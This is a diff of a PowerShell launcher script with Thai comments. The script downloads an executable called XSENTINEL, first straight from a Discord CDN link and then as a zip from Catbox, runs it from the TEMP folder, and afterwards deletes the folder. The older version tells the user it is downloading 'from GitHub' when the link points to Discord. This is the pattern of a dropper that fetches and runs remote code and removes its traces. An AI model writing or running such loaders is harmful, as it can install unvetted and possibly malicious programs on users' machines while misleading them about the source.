@@ -1,28 +1,38 @@
+# --- CONFIG ---
+# ใส่ลิ้งก์ไฟล์ .zip จาก Catbox ของคุณที่นี่
+$url = "https://files.catbox.moe/n4g6f5.zip" 
+$tempDir = "$env:TEMP\X_SENTINEL_LAB"
+$zipFile = "$tempDir\data.zip"
+$exeName = "XSENTINEL.exe" 
 
-$url = "https://cdn.discordapp.com/attachments/1501119476593328178/1501246322290725116/XSENTINEL.exe?ex=69fb6017&is=69fa0e97&hm=44ff3324906139e17e5c7764ce85832f0ad7e811b466acd27d7150757dbb3d4d&"
-$dest = "$env:TEMP\XSENTINEL.exe"
-
-
-[console]::beep(523, 150); [console]::beep(659, 150)
-
-Write-Host "--------------------------------------------" -ForegroundColor Cyan
-Write-Host "      XSENTINEL GITHUB AUTO-LAUNCHER        " -ForegroundColor White
-Write-Host "--------------------------------------------" -ForegroundColor Cyan
+# 1. เตรียม Folder ทำงาน
+if (Test-Path $tempDir) { Remove-Item -Path $tempDir -Recurse -Force }
+New-Item -ItemType Directory -Path $tempDir | Out-Null
 
 try {
-    Write-Host "[>] Downloading XSENTINEL from GitHub..." -ForegroundColor Yellow
-    Invoke-WebRequest -Uri $url -OutFile $dest -ErrorAction Stop
-    
-    # เสียงแจ้งเตือนเมื่อโหลดเสร็จ (โด-มี-โซ)
-    [console]::beep(523, 150); [console]::beep(659, 150); [console]::beep(783, 150)
-    
-    Write-Host "[+] Download Complete!" -ForegroundColor Green
-    Write-Host "[!] Launching Program..." -ForegroundColor Cyan
-    
-    # 3. สั่งรันไฟล์
-    Start-Process -FilePath $dest
+    # 2. ดาวน์โหลดจาก Catbox
+    Write-Host "[>] Downloading from Catbox..." -ForegroundColor Yellow
+    Invoke-WebRequest -Uri $url -OutFile $zipFile -ErrorAction Stop
+
+    # 3. แตกไฟล์ออกมา
+    Write-Host "[>] Extracting package..." -ForegroundColor Cyan
+    Expand-Archive -Path $zipFile -DestinationPath $tempDir -Force
+
+    # 4. ตรวจสอบและเริ่มรัน
+    $targetExe = Join-Path $tempDir $exeName
+    if (Test-Path $targetExe) {
+        Write-Host "[!] Launching Program..." -ForegroundColor Green
+        # รันและรอให้โปรแกรมปิด (เพื่อรอเวลาลบไฟล์ทิ้ง)
+        $process = Start-Process -FilePath $targetExe -PassThru -Wait
+        
+        # 5. ลบไฟล์ทิ้งทันทีเมื่อปิดโปรแกรม
+        Write-Host "[+] Cleaning up system..." -ForegroundColor Magenta
+        Remove-Item -Path $tempDir -Recurse -Force
+        Write-Host "[√] Finished!" -ForegroundColor Green
+    } else {
+        Write-Host "[X] Error: $exeName not found in zip!" -ForegroundColor Red
+    }
 }
 catch {
-    Write-Host "[X] Error: ไม่สามารถโหลดไฟล์ได้ ตรวจสอบลิงก์หรืออินเทอร์เน็ต" -ForegroundColor Red
-    [console]::beep(200, 500)
+    Write-Host "[X] Download Failed! Check your Catbox link." -ForegroundColor Red
 }
